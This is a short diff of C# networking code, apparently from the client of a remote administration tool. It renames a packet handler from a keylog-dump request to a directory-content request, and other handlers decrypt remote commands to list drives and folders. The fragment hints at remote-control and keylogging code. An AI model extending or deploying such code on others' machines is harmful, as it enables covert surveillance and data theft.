@@ -125,11 +125,10 @@ namespace Client.Core.Networking
             {
                 GetDriveInfo.Execute(Cryptography.Decrypt(incomingData));
             });
-            Connection.AppendIncomingPacketHandler<string>("GetKeylogDumpLengthReq", (packetHeader, connection, incomingData) =>
+            Connection.AppendIncomingPacketHandler<string>("GetDirectoryContentReq", (packetHeader, connection, incomingData) =>
             {
                 GetDirectorContent.Execute(Cryptography.Decrypt(incomingData));
             });
-
         }
 
         public static void StartReconnect()
